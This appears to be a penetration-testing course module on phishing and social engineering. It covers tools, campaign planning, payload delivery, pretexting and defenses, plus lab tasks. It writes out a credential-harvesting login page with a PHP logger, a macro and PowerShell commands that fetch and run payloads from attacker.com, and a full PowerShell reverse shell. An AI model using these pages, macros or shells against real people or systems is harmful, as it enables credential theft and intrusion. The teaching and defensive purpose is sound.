# Module 11: Phishing & Social Engineering

## Objectives
- Understand social engineering principles and human attack vectors
- Create targeted phishing campaigns using industry tools
- Deliver payloads via email, attachments, and links
- Understand pretexting, vishing, and physical social engineering
- Defend against social engineering attacks

---

## 11.1 Social Engineering Fundamentals

Social engineering exploits human psychology rather than technical vulnerabilities. It's often the easiest path into an organization — a well-crafted phishing email can bypass millions of dollars in technical controls.

### The Social Engineering Mindset
- **People are the weakest link:** Technical controls can be perfect, but humans make mistakes
- **Trust is exploited:** Attackers impersonate authority figures, colleagues, or trusted brands
- **Urgency bypasses thinking:** "Act now or your account will be suspended" triggers action without analysis
- **Curiosity is weaponized:** "Your invoice is attached" or "Check out this photo of you" prompts opening files
- **Helpfulness is exploited:** "I'm from IT and I need your password to fix an issue" targets helpful employees

### Social Engineering Types

| Type | Medium | Example |
|------|--------|---------|
| **Phishing** | Email | Fake login page, malicious attachment |
| **Spear phishing** | Email | Targeted email to specific individual with personal details |
| **Whaling** | Email | Phishing targeting executives or high-value individuals |
| **Smishing** | SMS | Fake SMS with malicious link |
| **Vishing** | Voice (phone) | Phone call impersonating support or executive |
| **Pretexting** | Any | Building a fabricated scenario to extract information |
| **Baiting** | Physical/digital | USB drops, fake downloads, free gift cards |
| **Quid pro quo** | Any | Offering a service in exchange for information |
| **Tailgating** | Physical | Following an authorized person through a door |

---

## 11.2 Phishing Campaign Planning

### Reconnaissance for Targeted Phishing
Effective spear phishing requires research on the target:

1. ** organizational structure:** Who reports to whom? Who has authority?
2. **Email formats:** name@company.com? first.last@? initials@?
3. **Technology stack:** What email platform? What security tools? What browser?
4. **Business context:** What projects are active? What vendors do they use? What's happening in the industry?
5. **Individual details:** Names of colleagues, recent events, job responsibilities

**OSINT sources for phishing recon:**
- LinkedIn (roles, colleagues, org chart)
- Company website (email formats, org structure, vendor mentions)
- Twitter/LinkedIn posts (current projects, events, concerns)
- Previous data breaches (exposed emails, passwords, personal info)
- CV/resume postings (technologies used, tools, responsibilities)

### Phishing Email Crafting
A successful phishing email typically has:

| Element | Purpose | Example |
|---------|---------|---------|
| **Sender spoofing/imitation** | Looks legitimate | Support@company.com, CEO's name, known vendor |
| **Relevant subject line** | Gets opened | "Invoice overdue," "Password reset required," "Your report is ready" |
| **Contextual body** | Builds trust | Mention real projects, colleagues, or events |
| **Urgency or curiosity** | Prompts action | " within 24 hours or account locked," "You won't believe this" |
| **Clear call to action** | Drives the click | "Click here to view," "Download the attachment," "Reply with information" |
| **Professional appearance** | Reduces suspicion | Proper grammar (or deliberately imperfect to target less sophisticated victims), company logo, footer |

### Phishing Kill Chain
1. **Reconnaissance** — gather target information
2. **Weaponization** — create the phishing email and payload
3. **Delivery** — send the email (via mail server, API, or spoofing)
4. **Exploitation** — victim clicks link or opens attachment
5. **Installation** — malware or credential harvester is deployed
6. **C2** — attacker establishes command and control
7. **Actions on objectives** — data exfiltration, lateral movement, etc.

---

## 11.3 Phishing Tools

### SET (Social-Engineer Toolkit)

SET is a comprehensive phishing and social engineering tool.

```bash
# Launch SET
setoolkit

# Menu navigation:
# 1) Social-Engineering Attacks
# 2) Pentesting (E)xploits
# ...
# Select: 1 (Social-Engineering Attacks)
# Then select: Email Attack Vector
# Then select: Credential Harvester Attack Method
# Then select: Site Cloner (clones a legitimate login page)
```

**SET Workflow:**
1. Choose attack vector (email, web, etc.)
2. Choose payload type (credential harvester, file-format exploit, etc.)
3. Configure the target (IP, domain, cloning URL)
4. Send the email (via SMTP or manual)
5. Wait for victim interaction
6. Capture credentials or execute payload

### GoPhish

GoPhish is an open-source phishing framework for creating and managing phishing campaigns.

```bash
# Install GoPhish
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
cd gophish

# Configure config.json (admin password, listen IP, etc.)

# Run GoPhish
./gophish

# Access web interface at https://kali:3333
# Default admin:admin

# Campaign setup:
# 1. Create SMTP server (or use SendGrid, Mailgun, etc.)
# 2. Create landing page (clone a login page or custom page)
# 3. Create email template (subject, body, HTML, sender)
# 4. Create user group (target email addresses)
# 5. Launch campaign
# 6. Track opens, clicks, credentials captured
```

### Evilginx / Modlishka / Muraena

These are "man-in-the-middle" phishing frameworks that proxy legitimate authentication flows, capturing credentials and session tokens in real time. Unlike simple credential harvesters, they can bypass MFA in some configurations by capturing the session token after authentication.

```bash
# Evilginx2 example
evilginx2 -p owa           # Use Outlook Web App module
evilginx2 -p azure         # Use Azure AD module

# Creates a phishing domain (attacker.com) that proxies to real service (login.microsoftonline.com)
# Victim enters credentials + MFA on the phishing page
# Evilginx captures credentials AND session token
# Attacker uses session token to access the real service
```

**Important:** These tools require domain registration and DNS configuration. The phishing domain must look legitimate (e.g., paypa1.com, micr0soft.com).

### Custom Phishing Page Creation

For more control, create custom phishing pages:

```html
<!-- Basic fake login page -->
<!DOCTYPE html>
<html>
<head><title>Corporate Portal - Login</title></head>
<body>
  <div class="login-box">
    <h2>Corporate Portal</h2>
    <form method="POST" action="https://attacker.com/capture.php">
      <input type="email" name="email" placeholder="Email" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Sign In</button>
    </form>
  </div>
</body>
</html>

<!-- capture.php: logs credentials and redirects to real login page -->
<?php
$email = $_POST['email'];
$password = $_POST['password'];
file_put_contents('credentials.txt', "$email:$password\n", FILE_APPEND);
header('Location: https://real-portal.company.com/login');
exit;
?>
```

---

## 11.4 Payload Delivery

### Attachment-Based Payloads

| Payload Type | Delivery | Execution |
|--------------|----------|-----------|
| **Macro-enabled document** (.docm, .xlsm) | Email attachment | User enables macros → PowerShell downloads and executes payload |
| **PDF with embedded JS** | Email attachment | PDF reader executes embedded JavaScript → downloads payload |
| **HTML application** (.hta) | Email attachment | Double-click → HTA runs VBScript/JavaScript → payload execution |
| **ISO/IMG file** | Email attachment | User mounts → visible file (often a shortcut or executable) |
| **Archive with executable** (.zip, .rar) | Email attachment | User extracts and runs executable |
| **Shortcut file** (.lnk) | Email attachment or USB | User clicks shortcut → PowerShell or cmd runs payload |

### Office Macro Example
A malicious macro in a Word document:

```vba
' This is what a malicious macro looks like (simplified)
Sub Document_Open()
    Dim objShell As Object
    Set objShell = CreateObject("WScript.Shell")
    ' Download and execute payload
    objShell.Run "powershell -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri 'http://attacker.com/payload.exe' -OutFile '%TEMP%\update.exe'; Start-Process '%TEMP%\update.exe'"""
End Sub
```

**Defensive note:** Modern Office blocks macros from internet-downloaded files by default. Bypassing this requires social engineering the user to "enable content" or using more advanced techniques.

### PowerShell Payload Delivery
PowerShell is the most common payload delivery mechanism in Windows environments.

```powershell
# Download and execute (fileless)
powershell -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"

# Download and execute as a file
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'http://attacker.com/payload.exe' -OutFile '$env:TEMP\svchost.exe'; Start-Process '$env:TEMP\svchost.exe'"

# Encoded payload (obfuscation)
powershell -EncodedCommand <base64_encoded_command>

# Reverse shell via PowerShell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "\$client = New-Object Net.Sockets.TCPClient('10.10.1.10',4444); \$stream = \$client.GetStream(); [byte[]]\$bytes = 0..65535|%{0}; \$sendbytes = (New-Object Byte[] 30000);\$size = 1..30000|%{\$i =\$_; \$sendbytes[\$_-1] = (Get-Random -Minimum 0 -Maximum 255)}; while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){ \$data = (New-Object -Type System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i); \$sendback = (iex \$data 2>&1 | Out-String ); \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> '; \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2); \$stream.Write(\$sendbyte,0,\$sendbyte.Length); \$stream.Flush()}; \$client.Close()"
```

### Attacker Infrastructure

| Component | Purpose | Tools |
|-----------|---------|-------|
| **Phishing domain** | Looks like legitimate service | Domain registration, typosquatting |
| **Sending infrastructure** | Sends phishing emails | SMTP server, SendGrid, Amazon SES, compromised servers |
| **Landing page** | Captures credentials/session | Custom HTML, SET, GoPhish, Evilginx |
| **C2 server** | Controls compromised systems | Cobalt Strike, Sliver, Mythic, custom |
| **Redirect/pivot** | Hides infrastructure | Redirectors, compromised hosting |

---

## 11.5 Pretexting and Non-Email Social Engineering

### Pretexting Scenarios

| Pretext | Scenario | Goal |
|---------|----------|------|
| **IT Support** | "We're upgrading the email system, need to verify your account" | Credential harvesting |
| **Executive impersonation** | "I'm in a meeting, need you to process this urgently" (BEC) | Financial fraud, data access |
| **Vendor impersonation** | "This is the new account rep from your software vendor" | Information gathering, trust building |
| ** auditors/compliance** | "We're doing a security audit, need to verify access controls" | Sensitive information, credentials |
| **HR/Recruiting** | "I saw your profile, we're hiring for a senior role" | Personal info, org details |

### Vishing (Voice Phishing)
Phone-based social engineering. Requires real-time interaction and quick thinking.

**Vishing approach:**
1. Research the target and organization beforehand
2. Call with a credible pretext
3. Build rapport quickly — sound confident, knowledgeable, and professional
4. Create a sense of urgency or authority
5. Ask for specific information or actions

### Physical Social Engineering

| Technique | Description | Risk |
|-----------|-------------|------|
| **USB drops** | Leave infected USB drives in parking lot, lobby, etc. | Curiosity → plug in → compromise |
| **Tailgating** | Follow authorized person through secured door | Physical access to facilities |
| **Impersonation** | Dress as delivery person, IT, contractor | Build access and trust |
| **Shoulder surfing** | Watch someone enter credentials or sensitive info | Credential or information capture |
| **Dumpster diving** | Search trash for sensitive documents | Information gathering |

---

## 11.6 Detection and Defense

### Email Security Controls

| Control | Function | Bypass Difficulty |
|---------|----------|-------------------|
| **SPF (Sender Policy Framework)** | Specifies which servers can send mail for a domain | Spoofing blocked for SPF-enforced domains |
| **DKIM (DomainKeys Identified Mail)** | Cryptographic signing of emails | Spoofed emails fail signature check |
| **DMARC** | Policy for SPF/DKIM failures (quarantine, reject) | Strongly prevents domain spoofing |
| **Email filtering (gateway)** | Scans emails for malware, suspicious links, phishing patterns | Content analysis, URL rewriting, attachment sandboxing |
| **Attachment sandboxing** | Opens attachments in a VM to detect malicious behavior | Detects macro malware, exploits |
| **URL rewriting** | Rewrites URLs to scan through security service | Detects malicious links at click time |
| **MFA** | Requires second factor beyond password | Renders stolen credentials insufficient alone |

### User Awareness
The most effective defense against social engineering is a trained, aware user base:

- **Phishing simulations:** Regular simulated phishing to keep awareness high
- **Reporting culture:** Easy reporting (e.g., "Report Phishing" button) without blame
- **Training:** How to identify phishing indicators (sender address, urgency, unusual requests)
- **Verification procedures:** Call back on known numbers for sensitive requests, use out-of-band verification

### Technical Detection

| Indicator | Detection Method |
|-----------|-----------------|
| **Suspicious email** | Header analysis (spoofed sender, unusual reply-to, missing SPF/DKIM) |
| **Malicious link** | URL reputation, sandbox analysis, user report |
| **Malicious attachment** | Antivirus, sandbox, macro analysis |
| **Credential submission** | Monitor for submissions to unknown domains; unusual login patterns |
| **Post-phishing activity** | EDR alerts on suspicious process execution, network connections |
| **BEC indicators** | Unusual financial requests, changes to payment details, urgency + secrecy |

---

## 11.7 Lab: Phishing & Social Engineering

### Setup
- Kali Linux (10.10.1.10)
- GoPhish installed (or SET)
- SMTP server (can use a test account with SendGrid, Mailgun, or set up a local SMTP server)
- DVWA or a test web application for credential harvesting
- Windows 10 client (10.10.1.101) as the phishing target (in the isolated lab)
- A test domain for phishing (can use a local domain or a purchased domain for lab purposes)

### Tasks

**Task 1: Social Engineering Reconnaissance**
1. Research the target organization (the lab environment or a real target if authorized):
   - Find email format
   - Identify key personnel (from LinkedIn, company website)
   - Find technology stack (email platform, security tools mentioned)
   - Identify business context (industry, projects, vendors)
2. Create a target profile document with:
   - Target individuals (name, role, email if known)
   - Organizational context
   - Potential pretexts that would work for this target
   - Technical environment (what email security might be in place)

**Task 2: SET Credential Harvester**
1. Launch SET and configure a credential harvester attack:
   - Select "Email Attack Vector" → "Credential Harvester"
   - Clone a legitimate login page (e.g., a corporate portal, OWA, or a test page in the lab)
   - Configure the phishing URL and listening host
2. Create the phishing email within SET:
   - Craft a convincing subject line and body
   - Set up the sending method (SMTP or manual instructions)
3. Send the phishing email to a test account (your own test email or a lab target)
4. When the test victim clicks and enters credentials, capture them
5. Document: email content, landing page, captured credentials, user experience

**Task 3: GoPhish Campaign**
1. Set up GoPhish:
   - Configure admin password
   - Set up SMTP (or use a mock SMTP for the lab)
2. Create a landing page:
   - Clone a legitimate login page or create a custom one
   - Set up credential capture
3. Create an email template:
   - Write a realistic phishing email
   - Include a link to the landing page
   - Set sender name and address
4. Create a user group with the lab target's email
5. Launch the campaign
6. Track results: opens, clicks, credential submissions
7. Document the campaign setup, email, landing page, and results

**Task 4: Malicious Document Creation (Lab Only)**
*Note: Only create malicious documents in the isolated lab for training purposes.*
1. Create a macro-enabled document (.docm) that:
   - Appears to be a legitimate business document (invoice, report, etc.)
   - Contains a macro that downloads and executes a payload
   - The payload should be a simple reverse shell or beacon (for demonstration)
2. Document how the macro works and what it does
3. Test in the lab: send to a test machine, observe execution
4. Note: This is for understanding how these attacks work. In real engagements, document the risk rather than actually executing malware.

**Task 5: Phishing Analysis and Detection**
1. Analyze your own phishing email from the defender's perspective:
   - Check email headers: SPF, DKIM, DMARC results
   - Analyze the sender address — what indicators give it away?
   - Analyze the link — where does it actually lead?
   - Analyze the landing page — what makes it look legitimate or suspicious?
2. Document detection indicators:
   - What would a security tool flag?
   - What would a trained user notice?
   - What would be hard to detect?

**Task 6: Phishing Defense Recommendations**
1. Based on your attack experience, create a defense recommendation:
   - Technical controls (email filtering, MFA, URL rewriting, attachment sandboxing)
   - User training (what to teach users to look for, how to report)
   - Process improvements (verification procedures for sensitive requests)
   - Detection improvements (logging, monitoring, alerting)
2. Prioritize recommendations by effectiveness and feasibility

**Task 7: Pretexting Exercise (Role Play)**
*Note: In a real training environment, this may be simulated or role-played.*
1. Develop a vishing or in-person pretext scenario based on the target organization
2. Write a script or outline for the interaction
3. Identify what information you're trying to obtain
4. Identify what social engineering principles you're using (urgency, authority, helpfulness, reciprocity, etc.)
5. Practice or simulate the interaction
6. Document what worked, what didn't, and what you learned

**Bonus: BEC Simulation**
Business Email Compromise (BEC) is a high-impact form of phishing targeting financial transactions or sensitive data.
1. Create a BEC scenario: impersonating an executive requesting an urgent wire transfer or sensitive document
2. Document:
   - How you would identify the target executive and their assistant/manner
   - The pretext and email content
   - What verification measures would prevent this attack
   - Why BEC is so effective despite being "simple"

---

## 11.8 Expected Outcomes

By the end of this module, you should be able to:
- Plan and execute a phishing campaign using SET or GoPhish
- Create convincing phishing emails and landing pages
- Understand payload delivery via attachments and links
- Analyze phishing from the defender's perspective
- Understand BEC, vishing, and physical social engineering
- Recommend technical and human defenses against social engineering

---

## 11.9 Assessment Criteria

| Criteria | Points | Description |
|----------|--------|-------------|
| Reconnaissance | 5 | Documents target research and its role in phishing planning |
| SET/GoPhish campaign | 10 | Successfully configures and executes a phishing campaign |
| Email and landing page quality | 10 | Convincing, realistic email and landing page design |
| Payload delivery understanding | 5 | Demonstrates understanding of attachment/link delivery methods |
| Phishing analysis | 10 | Analyzes own phishing from defender perspective, identifies indicators |
| Defense recommendations | 10 | Practical, prioritized defense recommendations |
| Report quality | 10 | Professional documentation of methodology, results, analysis |
| **Total** | **60** | |

**Pass threshold:** 45/60 (75%)

### Report Requirements (4–5 pages)
1. Target reconnaissance — what was researched, how it informed the attack
2. Phishing campaign details — email content, landing page, sending method
3. Campaign results — opens, clicks, credentials captured (or simulated results)
4. Payload analysis — if attachments were used, how they work and what they do
5. Detection analysis — what indicators would reveal this phishing to defenders
6. Defense recommendations — technical controls, user training, process improvements
7. Ethical and legal considerations — authorization, scope, impact on targets
